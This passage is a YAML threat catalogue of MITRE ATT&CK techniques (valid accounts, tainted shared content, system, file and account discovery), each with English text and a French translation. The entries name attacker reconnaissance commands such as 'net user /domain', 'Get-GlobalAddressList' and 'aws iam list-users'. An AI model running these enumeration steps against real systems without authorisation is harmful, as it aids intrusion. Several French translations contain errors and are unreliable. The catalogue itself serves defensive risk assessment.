      Defense Evasion.(Citation: TechNet Credential Theft) Domain accounts are those
      managed by Active Directory Domain Services where access and permissions are
      configured across systems and services that are part of that domain. Domain
      accounts can cover users, administrators, and services.(Citation: Microsoft
      AD Accounts)


      Adversaries may compromise domain accounts, some with a high level of privileges,
      through various means such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003)
      or password reuse, allowing access to privileged resources of the domain.

      https://attack.mitre.org/techniques/T1078/002'
    translations:
      fr:
        name: Comptes de domaine
        description: "Les adversaires peuvent obtenir et abuser des identifiants d\u2019\
          un compte de domaine comme moyen d\u2019obtenir un acc\xE8s initial, une\
          \ persistance, une escalade de privil\xE8ges ou une \xE9vasion de d\xE9\
          fense. (Citation : Vol de dipl\xF4me TechNet) Les comptes de domaine sont\
          \ ceux g\xE9r\xE9s par Active Directory Domain Services, o\xF9 l\u2019acc\xE8\
          s et les permissions sont configur\xE9s entre les syst\xE8mes et services\
          \ faisant partie de ce domaine. Les comptes de domaine peuvent couvrir les\
          \ utilisateurs, les administrateurs et les services. (Citation : Comptes\
          \ Microsoft AD)\n\nLes adversaires peuvent compromettre des comptes de domaine,\
          \ certains disposant d\u2019un haut niveau de privil\xE8ges, par divers\
          \ moyens tels que le [D\xE9versement des identifiants du syst\xE8me d\u2019\
          exploitation](https://attack.mitre.org/techniques/T1003) ou la r\xE9utilisation\
          \ de mots de passe, permettant ainsi l\u2019acc\xE8s aux ressources privil\xE9\
          gi\xE9es du domaine.\nhttps://attack.mitre.org/techniques/T1078/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1078.003
    ref_id: T1078.003
    name: Local Accounts
    description: 'Adversaries may obtain and abuse credentials of a local account
      as a means of gaining Initial Access, Persistence, Privilege Escalation, or
      Defense Evasion. Local accounts are those configured by an organization for
      use by users, remote support, services, or for administration on a single system
      or service.


      Local Accounts may also be abused to elevate privileges and harvest credentials
      through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003).
      Password reuse may allow the abuse of local accounts across a set of machines
      on a network for the purposes of Privilege Escalation and Lateral Movement.

      https://attack.mitre.org/techniques/T1078/003'
    translations:
      fr:
        name: Comptes locaux
        description: "Les adversaires peuvent obtenir et abuser des identifiants d\u2019\
          un compte local afin d\u2019obtenir un acc\xE8s initial, de la persistance,\
          \ de l\u2019escalade de privil\xE8ge ou de l\u2019\xE9vasion de la d\xE9\
          fense. Les comptes locaux sont ceux configur\xE9s par une organisation pour\
          \ une utilisation par les utilisateurs, le support \xE0 distance, des services\
          \ ou pour l\u2019administration d\u2019un seul syst\xE8me ou service.\n\n\
          Les comptes locaux peuvent \xE9galement \xEAtre abus\xE9s pour augmenter\
          \ des privil\xE8ges et r\xE9colter des identifiants via [OS Credential Dumping](https://attack.mitre.org/techniques/T1003).\
          \ La r\xE9utilisation du mot de passe peut permettre l\u2019abus de comptes\
          \ locaux sur un ensemble de machines d\u2019un r\xE9seau aux fins de l\u2019\
          escalade de privil\xE8ges et du mouvement lat\xE9ral.\nhttps://attack.mitre.org/techniques/T1078/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1078.004
    ref_id: T1078.004
    name: Cloud Accounts
    description: "Valid accounts in cloud environments may allow adversaries to perform\
      \ actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense\
      \ Evasion. Cloud accounts are those created and configured by an organization\
      \ for use by users, remote support, services, or for administration of resources\
      \ within a cloud service provider or SaaS application. Cloud Accounts can exist\
      \ solely in the cloud; alternatively, they may be hybrid-joined between on-premises\
      \ systems and the cloud through syncing or federation with other identity sources\
      \ such as Windows Active Directory.(Citation: AWS Identity Federation)(Citation:\
      \ Google Federating GC)(Citation: Microsoft Deploying AD Federation)\n\nService\
      \ or user accounts may be targeted by adversaries through [Brute Force](https://attack.mitre.org/techniques/T1110),\
      \ [Phishing](https://attack.mitre.org/techniques/T1566), or various other means\
      \ to gain access to the environment. Federated or synced accounts may be a pathway\
      \ for the adversary to affect both on-premises systems and cloud environments\
      \ - for example, by leveraging shared credentials to log onto [Remote Services](https://attack.mitre.org/techniques/T1021).\
      \ High privileged cloud accounts, whether federated, synced, or cloud-only,\
      \ may also allow pivoting to on-premises environments by leveraging SaaS-based\
      \ [Software Deployment Tools](https://attack.mitre.org/techniques/T1072) to\
      \ run commands on hybrid-joined devices.\n\nAn adversary may create long lasting\
      \ [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001)\
      \ on a compromised cloud account to maintain persistence in the environment.\
      \ Such credentials may also be used to bypass security controls such as multi-factor\
      \ authentication. \n\nCloud accounts may also be able to assume [Temporary Elevated\
      \ Cloud Access](https://attack.mitre.org/techniques/T1548/005) or other privileges\
      \ through various means within the environment. Misconfigurations in role assignments\
      \ or role assumption policies may allow an adversary to use these mechanisms\
      \ to leverage permissions outside the intended scope of the account. Such over\
      \ privileged accounts may be used to harvest sensitive data from online storage\
      \ accounts and databases through [Cloud API](https://attack.mitre.org/techniques/T1059/009)\
      \ or other methods. For example, in Azure environments, adversaries may target\
      \ Azure Managed Identities, which allow associated Azure resources to request\
      \ access tokens. By compromising a resource with an attached Managed Identity,\
      \ such as an Azure VM, adversaries may be able to [Steal Application Access\
      \ Token](https://attack.mitre.org/techniques/T1528)s to move laterally across\
      \ the cloud environment.(Citation: SpecterOps Managed Identity 2022)\nhttps://attack.mitre.org/techniques/T1078/004"
    translations:
      fr:
        name: Comptes cloud
        description: "Les comptes valides dans les environnements cloud peuvent permettre\
          \ aux adversaires d\u2019effectuer des actions pour obtenir l\u2019acc\xE8\
          s initial, la persistance, l\u2019escalade de privil\xE8ges ou l\u2019\xE9\
          vasion de d\xE9fense. Les comptes cloud sont ceux cr\xE9\xE9s et configur\xE9\
          s par une organisation pour \xEAtre utilis\xE9s par les utilisateurs, le\
          \ support \xE0 distance, les services, ou pour l\u2019administration de\
          \ ressources au sein d\u2019un fournisseur de services cloud ou d\u2019\
          une application SaaS. Les comptes cloud peuvent exister uniquement dans\
          \ le cloud ; alternativement, ils peuvent \xEAtre hybridement connect\xE9\
          s entre les syst\xE8mes sur site et le cloud via la synchronisation ou la\
          \ f\xE9d\xE9ration avec d\u2019autres sources d\u2019identit\xE9 telles\
          \ que Windows Active Directory. (Citation : AWS Identity Federation)(Citation\
          \ : Google Federating GC)(Citation : Microsoft d\xE9ploie la F\xE9d\xE9\
          ration AD)\n\nLes comptes de service ou d\u2019utilisateurs peuvent \xEA\
          tre cibl\xE9s par des adversaires via [Brute Force](https://attack.mitre.org/techniques/T1110),\
          \ [Phishing](https://attack.mitre.org/techniques/T1566) ou divers autres\
          \ moyens d\u2019acc\xE9der \xE0 l\u2019environnement. Les comptes f\xE9\
          d\xE9r\xE9s ou synchronis\xE9s peuvent constituer une voie pour l\u2019\
          adversaire d\u2019affecter \xE0 la fois les syst\xE8mes sur site et les\
          \ environnements cloud \u2013 par exemple, en exploitant des identifiants\
          \ partag\xE9s pour se connecter \xE0 [Services Distants](https://attack.mitre.org/techniques/T1021).\
          \ Les comptes cloud \xE0 haut privil\xE8ge, qu\u2019ils soient f\xE9d\xE9\
          r\xE9s, synchronis\xE9s ou uniquement cloud, peuvent \xE9galement permettre\
          \ de pivoter vers des environnements locaux en utilisant les [Software Deployment\
          \ Tools](https://attack.mitre.org/techniques/T1072) bas\xE9s sur SaaS pour\
          \ ex\xE9cuter des commandes sur des appareils hybrides.\n\nUn adversaire\
          \ peut cr\xE9er des [identifiants cloud suppl\xE9mentaires](https://attack.mitre.org/techniques/T1098/001)\
          \ durables sur un compte cloud compromis afin de maintenir la persistance\
          \ dans l\u2019environnement. Ces identifiants peuvent \xE9galement \xEA\
          tre utilis\xE9s pour contourner des contr\xF4les de s\xE9curit\xE9 tels\
          \ que l\u2019authentification multifacteur. \n\nLes comptes cloud peuvent\
          \ \xE9galement \xEAtre capables d\u2019adopter des [Acc\xE8s Cloud \xC9\
          lev\xE9 Temporaire](https://attack.mitre.org/techniques/T1548/005) ou d\u2019\
          autres privil\xE8ges par divers moyens dans l\u2019environnement. Des mauvaises\
          \ configurations dans les assignations de r\xF4les ou les politiques d\u2019\
          assumtion de r\xF4le peuvent permettre \xE0 un adversaire d\u2019utiliser\
          \ ces m\xE9canismes pour obtenir des autorisations en dehors du champ d\u2019\
          application pr\xE9vu du compte. Ces comptes surprot\xE9g\xE9s peuvent \xEA\
          tre utilis\xE9s pour collecter des donn\xE9es sensibles provenant de comptes\
          \ de stockage en ligne et de bases de donn\xE9es via [Cloud API](https://attack.mitre.org/techniques/T1059/009)\
          \ ou d\u2019autres moyens. Par exemple, dans les environnements Azure, les\
          \ adversaires peuvent cibler les Identit\xE9s g\xE9r\xE9es Azure, qui permettent\
          \ aux ressources Azure associ\xE9es de demander des jetons d\u2019acc\xE8\
          s. En compromettant une ressource avec une identit\xE9 manag\xE9e attach\xE9\
          e, comme une VM Azure, les adversaires peuvent \xEAtre capables de [Voler\
          \ le Token d\u2019acc\xE8s \xE0 l\u2019application](https://attack.mitre.org/techniques/T1528)\
          \ pour les d\xE9placer lat\xE9ralement \xE0 travers l\u2019environnement\
          \ cloud. (Citation : Identit\xE9 g\xE9r\xE9e par SpecterOps 2022)\nhttps://attack.mitre.org/techniques/T1078/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1080
    ref_id: T1080
    name: Taint Shared Content
    description: 'Adversaries may deliver payloads to remote systems by adding content
      to shared storage locations, such as network drives or internal code repositories.
      Content stored on network drives or in other shared locations may be tainted
      by adding malicious programs, scripts, or exploit code to otherwise valid files.
      Once a user opens the shared tainted content, the malicious portion can be executed
      to run the adversary''s code on a remote system. Adversaries may use tainted
      shared content to move laterally.


      A directory share pivot is a variation on this technique that uses several other
      techniques to propagate malware when users access a shared network directory.
      It uses [Shortcut Modification](https://attack.mitre.org/techniques/T1547/009)
      of directory .LNK files that use [Masquerading](https://attack.mitre.org/techniques/T1036)
      to look like the real directories, which are hidden through [Hidden Files and
      Directories](https://attack.mitre.org/techniques/T1564/001). The malicious .LNK-based
      directories have an embedded command that executes the hidden malware file in
      the directory and then opens the real intended directory so that the user''s
      expected action still occurs. When used with frequently used network directories,
      the technique may result in frequent reinfections and broad access to systems
      and potentially to new and higher privileged accounts. (Citation: Retwin Directory
      Share Pivot)


      Adversaries may also compromise shared network directories through binary infections
      by appending or prepending its code to the healthy binary on the shared network
      directory. The malware may modify the original entry point (OEP) of the healthy
      binary to ensure that it is executed before the legitimate code. The infection
      could continue to spread via the newly infected file when it is executed by
      a remote system. These infections may target both binary and non-binary formats
      that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT,
      and/or .VBS.

      https://attack.mitre.org/techniques/T1080'
    translations:
      fr:
        name: "Contenu partag\xE9 de Taint"
        description: "Les adversaires peuvent livrer des charges utiles \xE0 des syst\xE8\
          mes distants en ajoutant du contenu \xE0 des emplacements de stockage partag\xE9\
          s, tels que des disques r\xE9seau ou des d\xE9p\xF4ts de code internes.\
          \ Le contenu stock\xE9 sur des disques r\xE9seau ou dans d\u2019autres emplacements\
          \ partag\xE9s peut \xEAtre entach\xE9 par l\u2019ajout de programmes malveillants,\
          \ scripts ou codes d\u2019exploitation \xE0 des fichiers autrement valides.\
          \ Une fois qu\u2019un utilisateur ouvre le contenu partag\xE9 et contamin\xE9\
          , la partie malveillante peut \xEAtre ex\xE9cut\xE9e pour ex\xE9cuter le\
          \ code de l\u2019adversaire sur un syst\xE8me distant. Les adversaires peuvent\
          \ utiliser du contenu partag\xE9 contamin\xE9 pour se d\xE9placer lat\xE9\
          ralement.\n\nUn pivot de partage de r\xE9pertoire est une variante de cette\
          \ technique qui utilise plusieurs autres techniques pour propager des logiciels\
          \ malveillants lorsque les utilisateurs acc\xE8dent \xE0 un r\xE9pertoire\
          \ r\xE9seau partag\xE9. Il utilise [Modification de raccourci](https://attack.mitre.org/techniques/T1547/009)\
          \ du r\xE9pertoire . LNK qui utilisent [Masquerading](https://attack.mitre.org/techniques/T1036)\
          \ pour ressembler aux r\xE9pertoires r\xE9els, qui sont cach\xE9s via [Hidden\
          \ Files and Directories](https://attack.mitre.org/techniques/T1564/001).\
          \ Les malveillants. Les annuaires bas\xE9s sur LNK disposent d\u2019une\
          \ commande int\xE9gr\xE9e qui ex\xE9cute le fichier malware cach\xE9 dans\
          \ le r\xE9pertoire puis ouvre le r\xE9pertoire r\xE9ellement pr\xE9vu afin\
          \ que l\u2019action attendue de l\u2019utilisateur se produise toujours.\
          \ Lorsqu\u2019elle est utilis\xE9e avec des annuaires r\xE9seau fr\xE9quemment\
          \ utilis\xE9s, la technique peut entra\xEEner des r\xE9infections fr\xE9\
          quentes et un acc\xE8s large aux syst\xE8mes et potentiellement \xE0 de\
          \ nouveaux comptes plus privil\xE9gi\xE9s. (Citation : Pivot du partage\
          \ de l\u2019annuaire Retwin)\n\nLes adversaires peuvent \xE9galement compromettre\
          \ les annuaires r\xE9seau partag\xE9s par des infections binaires en ajoutant\
          \ ou pr\xE9apprenant son code au binaire sain du r\xE9pertoire r\xE9seau\
          \ partag\xE9. Le malware peut modifier le point d\u2019entr\xE9e original\
          \ (OEP) du binaire sain afin de s\u2019assurer qu\u2019il est ex\xE9cut\xE9\
          \ avant le code l\xE9gitime. L\u2019infection pourrait continuer \xE0 se\
          \ propager via le nouveau fichier infect\xE9 lorsqu\u2019il est ex\xE9cut\xE9\
          \ par un syst\xE8me distant. Ces infections peuvent cibler \xE0 la fois\
          \ des formats binaires et non binaires qui se terminent par des extensions\
          \ incluant, mais sans s\u2019y limiter, .EXE, .DLL, . SCR, .BAT et/ou .VBS.\n\
          https://attack.mitre.org/techniques/T1080"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1082
    ref_id: T1082
    name: System Information Discovery
    description: 'An adversary may attempt to get detailed information about the operating
      system and hardware, including version, patches, hotfixes, service packs, and
      architecture. Adversaries may use this information to shape follow-on behaviors,
      including whether or not the adversary fully infects the target and/or attempts
      specific actions. This behavior is distinct from [Local Storage Discovery](https://attack.mitre.org/techniques/T1680)
      which is an adversary''s discovery of local drive, disks and/or volumes.


      Tools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used
      to gather detailed system information. If running with privileged access, a
      breakdown of system data can be gathered through the <code>systemsetup</code>
      configuration tool on macOS. Adversaries may leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)
      on network devices to gather detailed system information (e.g. <code>show version</code>).(Citation:
      US-CERT-TA18-106A) On ESXi servers, threat actors may gather system information
      from various esxcli utilities, such as `system hostname get` and `system version
      get`.(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)(Citation: Varonis)


      Infrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure
      allow access to instance and virtual machine information via APIs. Successful
      authenticated API calls can return data such as the operating system platform
      and status of a particular instance or the model view of a virtual machine.(Citation:
      Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft
      Virutal Machine API)


      [System Information Discovery](https://attack.mitre.org/techniques/T1082) combined
      with information gathered from other forms of discovery and reconnaissance can
      drive payload development and concealment.(Citation: OSX.FairyTale)(Citation:
      20 macOS Common Tools and Techniques)'
    translations:
      fr:
        name: "D\xE9couverte d\u2019informations syst\xE8me"
        description: "Un adversaire peut tenter d\u2019obtenir des informations d\xE9\
          taill\xE9es sur le syst\xE8me d\u2019exploitation et le mat\xE9riel, y compris\
          \ la version, les correctifs, les correctifs rapides, les packs de service\
          \ et l\u2019architecture. Les adversaires peuvent utiliser ces informations\
          \ pour fa\xE7onner les comportements suivants, notamment pour savoir si\
          \ l\u2019adversaire infecte compl\xE8tement la cible et/ou tente des actions\
          \ sp\xE9cifiques. Ce comportement est distinct de la [D\xE9couverte de stockage\
          \ local](https://attack.mitre.org/techniques/T1680) qui consiste \xE0 d\xE9\
          couvrir par un adversaire les lecteurs, disques et/ou volumes locaux.\n\n\
          Des outils tels que [Systeminfo](https://attack.mitre.org/software/S0096)\
          \ peuvent \xEAtre utilis\xE9s pour recueillir des informations d\xE9taill\xE9\
          es sur le syst\xE8me. Si l\u2019utilisation est en acc\xE8s privil\xE9gi\xE9\
          , une ventilation des donn\xE9es syst\xE8me peut \xEAtre recueillie via\
          \ l\u2019outil <code>de configuration systemsetup</code> sur macOS. Les\
          \ adversaires peuvent utiliser une [CLI de dispositif r\xE9seau](https://attack.mitre.org/techniques/T1059/008)\
          \ sur les dispositifs r\xE9seau pour recueillir des informations d\xE9taill\xE9\
          es du syst\xE8me (par exemple, <code>afficher la version</code>). (Citation\
          \ : US-CERT-TA18-106A) Sur les serveurs ESXi, les acteurs malveillants peuvent\
          \ collecter des informations syst\xE8me \xE0 partir de divers utilitaires\
          \ esxcli, tels que \xAB get system hostname \xBB et \xAB system version\
          \ get \xBB. (Citation : Crowdstrike Hyperviseur Jackpotting Partie 2 2021)(Citation\
          \ : Varonis)\n\nLes fournisseurs de cloud Infrastructure as a Service (IaaS)\
          \ tels qu\u2019AWS, GCP et Azure permettent l\u2019acc\xE8s aux informations\
          \ sur les instances et machines virtuelles via des API. Les appels API authentifi\xE9\
          s r\xE9ussis peuvent renvoyer des donn\xE9es telles que la plateforme du\
          \ syst\xE8me d\u2019exploitation et le statut d\u2019une instance particuli\xE8\
          re ou la vue mod\xE8le d\u2019une machine virtuelle. (Citation : Amazon\
          \ Describe Instance)(Citation : Ressource Google Instances)(Citation : Microsoft\
          \ Virutal Machine API)\n\n[D\xE9couverte d\u2019informations syst\xE8me](https://attack.mitre.org/techniques/T1082)\
          \ combin\xE9 aux informations recueillies lors d\u2019autres formes de d\xE9\
          couverte et de reconnaissance peut favoriser le d\xE9veloppement et la dissimulation\
          \ des charges utiles. (Citation : OSX. FairyTale)(Citation : 20 outils et\
          \ techniques courants sur macOS)"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1083
    ref_id: T1083
    name: File and Directory Discovery
    description: 'Adversaries may enumerate files and directories or may search in
      specific locations of a host or network share for certain information within
      a file system. Adversaries may use the information from [File and Directory
      Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery
      to shape follow-on behaviors, including whether or not the adversary fully infects
      the target and/or attempts specific actions.


      Many command shell utilities can be used to obtain this information. Examples
      include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>,
      and <code>locate</code>.(Citation: Windows Commands JPCERT) Custom tools may
      also be used to gather file and directory information and interact with the
      [Native API](https://attack.mitre.org/techniques/T1106). Adversaries may also
      leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)
      on network devices to gather file and directory information (e.g. <code>dir</code>,
      <code>show flash</code>, and/or <code>nvram</code>).(Citation: US-CERT-TA18-106A)


      Some files and directories may require elevated or specific user permissions
      to access.'
    translations:
      fr:
        name: "D\xE9couverte de fichiers et annuaires"
        description: "Les adversaires peuvent \xE9num\xE9rer des fichiers et des r\xE9\
          pertoires ou rechercher dans des emplacements sp\xE9cifiques d\u2019un partage\
          \ h\xF4te ou r\xE9seau certaines informations au sein d\u2019un syst\xE8\
          me de fichiers. Les adversaires peuvent utiliser les informations de [File\
          \ and Directory Discovery](https://attack.mitre.org/techniques/T1083) lors\
          \ de la d\xE9couverte automatis\xE9e pour fa\xE7onner les comportements\
          \ suivants, y compris si l\u2019adversaire infecte compl\xE8tement la cible\
          \ et/ou tente des actions sp\xE9cifiques.\n\nDe nombreux utilitaires de\
          \ shell de commande peuvent \xEAtre utilis\xE9s pour obtenir ces informations.\
          \ Des exemples incluent <code>dir</code>, <code>tree</code>, <code>ls</code>,\
          \ <code>find</code> et <code>locate</code>. (Citation : Commandes Windows\
          \ JPCERT) Des outils personnalis\xE9s peuvent \xE9galement \xEAtre utilis\xE9\
          s pour collecter des informations sur les fichiers et les r\xE9pertoires\
          \ et interagir avec l'[API native](https://attack.mitre.org/techniques/T1106).\
          \ Les adversaires peuvent \xE9galement utiliser une [CLI de dispositif r\xE9\
          seau](https://attack.mitre.org/techniques/T1059/008) sur les appareils r\xE9\
          seau pour collecter des informations de fichiers et de r\xE9pertoires (par\
          \ exemple, <code>dir</code>, <code>flash de pr\xE9sentation</code> et/ou\
          \ <code>nvram</code>). (Citation : US-CERT-TA18-106A)\n\nCertains fichiers\
          \ et r\xE9pertoires peuvent n\xE9cessiter des permissions utilisateur \xE9\
          lev\xE9es ou sp\xE9cifiques pour y acc\xE9der."
  - urn: urn:intuitem:risk:threat:mitre-attack:t1087
    ref_id: T1087
    name: Account Discovery
    description: "Adversaries may attempt to get a listing of valid accounts, usernames,\
      \ or email addresses on a system or within a compromised environment. This information\
      \ can help adversaries determine which accounts exist, which can aid in follow-on\
      \ behavior such as brute-forcing, spear-phishing attacks, or account takeovers\
      \ (e.g., [Valid Accounts](https://attack.mitre.org/techniques/T1078)).\n\nAdversaries\
      \ may use several methods to enumerate accounts, including abuse of existing\
      \ tools, built-in commands, and potential misconfigurations that leak account\
      \ names and roles or permissions in the targeted environment.\n\nFor examples,\
      \ cloud environments typically provide easily accessible interfaces to obtain\
      \ user lists.(Citation: AWS List Users)(Citation: Google Cloud - IAM Servie\
      \ Accounts List API) On hosts, adversaries can use default [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ and other command line functionality to identify accounts. Information about\
      \ email addresses and accounts may also be extracted by searching an infected\
      \ system\u2019s files.\nhttps://attack.mitre.org/techniques/T1087"
    translations:
      fr:
        name: "D\xE9couverte du compte"
        description: "Les adversaires peuvent tenter d\u2019obtenir une liste de comptes\
          \ valides, de noms d\u2019utilisateur ou d\u2019adresses e-mail sur un syst\xE8\
          me ou dans un environnement compromis. Ces informations peuvent aider les\
          \ adversaires \xE0 d\xE9terminer quels comptes existent, ce qui peut favoriser\
          \ des comportements ult\xE9rieurs tels que le brute-forcing, les attaques\
          \ de spear-phishing ou les prises de contr\xF4le de comptes (par exemple,\
          \ [Comptes valides](https://attack.mitre.org/techniques/T1078)).\n\nLes\
          \ adversaires peuvent utiliser plusieurs m\xE9thodes pour \xE9num\xE9rer\
          \ les comptes, notamment l\u2019abus d\u2019outils existants, les commandes\
          \ int\xE9gr\xE9es, et d\u2019\xE9ventuelles erreurs de configuration qui\
          \ divulguent des noms de comptes, des r\xF4les ou des autorisations dans\
          \ l\u2019environnement cibl\xE9.\n\nPar exemple, les environnements cloud\
          \ offrent g\xE9n\xE9ralement des interfaces facilement accessibles pour\
          \ obtenir des listes d\u2019utilisateurs. (Citation : Utilisateurs de la\
          \ liste AWS)(Citation : Google Cloud - API IAM Servie Accounts List) Sur\
          \ les h\xF4tes, les adversaires peuvent utiliser les fonctionnalit\xE9s\
          \ par d\xE9faut de [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
          \ et d\u2019autres fonctions en ligne de commande pour identifier les comptes.\
          \ Les informations sur les adresses e-mail et les comptes peuvent \xE9galement\
          \ \xEAtre extraites en recherchant les fichiers d\u2019un syst\xE8me infect\xE9\
          .\nhttps://attack.mitre.org/techniques/T1087"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1087.001
    ref_id: T1087.001
    name: Local Account
    description: 'Adversaries may attempt to get a listing of local system accounts.
      This information can help adversaries determine which local accounts exist on
      a system to aid in follow-on behavior.


      Commands such as <code>net user</code> and <code>net localgroup</code> of the
      [Net](https://attack.mitre.org/software/S0039) utility and <code>id</code> and
      <code>groups</code> on macOS and Linux can list local users and groups.(Citation:
      Mandiant APT1)(Citation: id man page)(Citation: groups man page) On Linux, local
      users can also be enumerated through the use of the <code>/etc/passwd</code>
      file. On macOS, the <code>dscl . list /Users</code> command can be used to enumerate
      local accounts. On ESXi servers, the `esxcli system account list` command can
      list local user accounts.(Citation: Crowdstrike Hypervisor Jackpotting Pt 2
      2021)

      https://attack.mitre.org/techniques/T1087/001'
    translations:
      fr:
        name: Compte local
        description: "Les adversaires peuvent tenter d\u2019obtenir une liste des\
          \ comptes du syst\xE8me local. Ces informations peuvent aider les adversaires\
          \ \xE0 d\xE9terminer quels comptes locaux existent sur un syst\xE8me afin\
          \ d\u2019aider \xE0 la suite des comportements.\n\nDes commandes telles\
          \ que <code>net user</code> et <code>net localgroup</code> de l\u2019utilitaire\
          \ [Net](https://attack.mitre.org/software/S0039) ainsi <code>que id</code>\
          \ and <code>groups</code> sur macOS et Linux peuvent lister les utilisateurs\
          \ et groupes locaux. (Citation : Mandiant APT1)(Citation : id man page)(Citation\
          \ : page de groupe manuelle) Sous Linux, les utilisateurs locaux peuvent\
          \ \xE9galement \xEAtre \xE9num\xE9r\xE9s via le fichier <code>/etc/passwd</code>.\
          \ Sur macOS, la commande <code>dscl . list /Users</code> peut \xEAtre utilis\xE9\
          e pour \xE9num\xE9rer les comptes locaux. Sur les serveurs ESXi, la commande\
          \ 'esxcli system account list' peut lister les comptes utilisateurs locaux.\
          \ (Citation : Crowdstrike Hyperviseur Jackpotting Partie 2 2021)\nhttps://attack.mitre.org/techniques/T1087/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1087.002
    ref_id: T1087.002
    name: Domain Account
    description: 'Adversaries may attempt to get a listing of domain accounts. This
      information can help adversaries determine which domain accounts exist to aid
      in follow-on behavior such as targeting specific accounts which possess particular
      privileges.


      Commands such as <code>net user /domain</code> and <code>net group /domain</code>
      of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscacheutil
      -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain
      users and groups. [PowerShell](https://attack.mitre.org/techniques/T1059/001)
      cmdlets including <code>Get-ADUser</code> and <code>Get-ADGroupMember</code>
      may enumerate members of Active Directory groups.(Citation: CrowdStrike StellarParticle
      January 2022)

      https://attack.mitre.org/techniques/T1087/002'
    translations:
      fr:
        name: Compte de domaine
        description: "Les adversaires peuvent tenter d\u2019obtenir une liste des\
          \ comptes de domaines. Ces informations peuvent aider les adversaires \xE0\
          \ d\xE9terminer quels comptes de domaine existent pour favoriser des comportements\
          \ ult\xE9rieurs, comme cibler des comptes sp\xE9cifiques disposant de privil\xE8\
          ges particuliers.\n\nDes commandes telles que <code>net user /domain</code>\
          \ et <code>net group /domain</code> de l\u2019utilitaire [Net](https://attack.mitre.org/software/S0039),\
          \ <code>dscacheutil -q</code> group sur macOS, et <code>ldapsearch</code>\
          \ sur Linux peuvent lister les utilisateurs et groupes de domaines. [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
          \ les cmdlets incluant <code>Get-ADUser</code> et <code>Get-ADGroupMember</code>\
          \ peuvent \xE9num\xE9rer les membres des groupes Active Directory. (Citation\
          \ : CrowdStrike StellarParticle janvier 2022)\nhttps://attack.mitre.org/techniques/T1087/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1087.003
    ref_id: T1087.003
    name: Email Account
    description: 'Adversaries may attempt to get a listing of email addresses and
      accounts. Adversaries may try to dump Exchange address lists such as global
      address lists (GALs).(Citation: Microsoft Exchange Address Lists)


      In on-premises Exchange and Exchange Online, the <code>Get-GlobalAddressList</code>
      PowerShell cmdlet can be used to obtain email addresses and accounts from a
      domain using an authenticated session.(Citation: Microsoft getglobaladdresslist)(Citation:
      Black Hills Attacking Exchange MailSniper, 2016)


      In Google Workspace, the GAL is shared with Microsoft Outlook users through
      the Google Workspace Sync for Microsoft Outlook (GWSMO) service. Additionally,
      the Google Workspace Directory allows for users to get a listing of other users
      within the organization.(Citation: Google Workspace Global Access List)

      https://attack.mitre.org/techniques/T1087/003'
    translations:
      fr:
        name: Compte Email
        description: "Les adversaires peuvent tenter d\u2019obtenir une liste d\u2019\
          adresses e-mail et de comptes. Les adversaires peuvent tenter de supprimer\
          \ les listes d\u2019adresses Exchange telles que les listes d\u2019adresses\
          \ globales (GAL). (Citation : listes d\u2019adresses Microsoft Exchange)\n\
          \nDans Exchange et Exchange Online sur site, le cmdlet <code>PowerShell\
          \ Get-GlobalAddressList</code> peut \xEAtre utilis\xE9 pour obtenir des\
          \ adresses e-mail et des comptes d\u2019un domaine via une session authentifi\xE9\
          e. (Citation : Microsoft getglobaladdresslist)(Citation : Black Hills attaque\
          \ Exchange MailSniper, 2016)\n\nDans Google Workspace, le GAL est partag\xE9\
          \ avec les utilisateurs de Microsoft Outlook via le service Google Workspace\
          \ Sync for Microsoft Outlook (GWSMO). De plus, l\u2019annuaire Google Workspace\
          \ permet aux utilisateurs d\u2019obtenir une liste d\u2019autres utilisateurs\
          \ au sein de l\u2019organisation. (Citation : Liste d\u2019acc\xE8s globale\
          \ Google Workspace)\nhttps://attack.mitre.org/techniques/T1087/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1087.004
    ref_id: T1087.004
    name: Cloud Account
    description: "Adversaries may attempt to get a listing of cloud accounts. Cloud\
      \ accounts are those created and configured by an organization for use by users,\
      \ remote support, services, or for administration of resources within a cloud\
      \ service provider or SaaS application.\n\nWith authenticated access there are\
      \ several tools that can be used to find accounts. The <code>Get-MsolRoleMember</code>\
      \ PowerShell cmdlet can be used to obtain account names given a role or permissions\
      \ group in Office 365.(Citation: Microsoft msolrolemember)(Citation: GitHub\
      \ Raindance) The Azure CLI (AZ CLI) also provides an interface to obtain user\
      \ accounts with authenticated access to a domain. The command <code>az ad user\
      \ list</code> will list all users within a domain.(Citation: Microsoft AZ CLI)(Citation:\
      \ Black Hills Red Teaming MS AD Azure, 2018) \n\nThe AWS command <code>aws iam\
      \ list-users</code> may be used to obtain a list of users in the current account\
      \ while <code>aws iam list-roles</code> can obtain IAM roles that have a specified\
      \ path prefix.(Citation: AWS List Roles)(Citation: AWS List Users) In GCP, <code>gcloud\
      \ iam service-accounts list</code> and <code>gcloud projects get-iam-policy</code>\
      \ may be used to obtain a listing of service accounts and users in a project.(Citation:\
      \ Google Cloud - IAM Servie Accounts List API)\nhttps://attack.mitre.org/techniques/T1087/004"
    translations:
      fr:
        name: Compte Cloud
        description: "Les adversaires peuvent tenter d\u2019obtenir une liste des\
